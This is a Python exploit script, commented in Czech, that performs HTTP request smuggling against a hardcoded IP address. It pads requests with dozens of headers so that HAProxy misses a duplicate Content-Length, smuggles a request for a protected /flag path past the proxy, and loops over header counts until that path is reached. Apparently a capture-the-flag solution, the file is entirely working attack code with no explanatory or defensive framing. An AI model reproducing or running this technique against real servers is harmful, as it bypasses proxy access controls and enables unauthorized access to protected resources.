import socket

HOST = "13.50.242.83"
PORT = 80


def send_cl_cl_smuggle(header_count):
    # Propašovaný požadavek, který chceme vykonat (přesně 61 bytů)
    smuggled = (
        "GET /flag HTTP/1.1\r\n"
        "Host: 13.50.242.83\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    smuggled_len = len(smuggled)

    # První CL (to, co uvidí HAProxy a uloží do indexu)
    req_start = (
        "POST /post HTTP/1.1\r\n"
        "Host: 13.50.242.83\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {smuggled_len}\r\n"
    )

    # Zbytečné hlavičky, které zaplní index v HAProxy
    padding = ""
    for i in range(header_count):
        padding += f"X-P{i}: 1\r\n"

    # Druhé CL, HAProxy ho díky plnému indexu neuloží (a tím pádem neodhalí duplikát).
    # Backend ho ale přečte jako poslední platnou hodnotu a nastaví tělo na 0!
    req_end = "Content-Length: 0\r\n\r\n"

    # Splachovací požadavek (aby nám HAProxy přeposlala i druhou odpověď z backendu)
    req2 = (
        "GET /get?foo=bar HTTP/1.1\r\n"
        "Host: 13.50.242.83\r\n"
        "Connection: close\r\n\r\n"
    )

    payload = req_start.encode() + padding.encode() + req_end.encode() + smuggled.encode() + req2.encode()

    try:
        with socket.create_connection((HOST, PORT), timeout=1.5) as s:
            s.sendall(payload)
            resp = b""
            while True:
                data = s.recv(4096)
                if not data: break
                resp += data
            return resp
    except Exception:
        return b""


print("[*] Spouštím útok 'Duplicate Content-Length Bypass' (CL.CL Smuggling)")
print("[*] Skenuji počet hlaviček pro přesné přetečení indexu (90 až 110)...\n")

for count in range(90, 110):
    resp = send_cl_cl_smuggle(count)

    if not resp:
        print(f"[*] {count} hlaviček -> TIMEOUT")
        continue

    # Extrahujeme HTTP kódy, ať vidíme, co se děje pod kapotou
    if b"431 Request Header" in resp:
        print(f"[-] {count} hlaviček -> Backend říká: 431 Too Large (Už jsme přetekli limit backendu)")
    elif b"400 Bad request" in resp:
        print(f"[-] {count} hlaviček -> HAProxy říká: 400 Bad Request (Index není plný, HAProxy nás chytla)")
    elif b"403 Forbidden" in resp:
        print(f"[-] {count} hlaviček -> HAProxy říká: 403 Forbidden (Smuggling selhal)")
    else:
        if b"flag{" in resp.lower() or b"{" in resp:
            print(f"\n[!!!] BINGO! VLAJKA ZÍSKÁNA U {count} HLAVIČEK [!!!]")
            print("--------------------------------------------------")
            print(resp.decode('utf-8', errors='ignore').strip())
            print("--------------------------------------------------")
            break
        else:
            print(f"\n[?] Nečekaná odpověď u {count} hlaviček:")
            print(resp.decode('utf-8', errors='ignore').strip()[:300])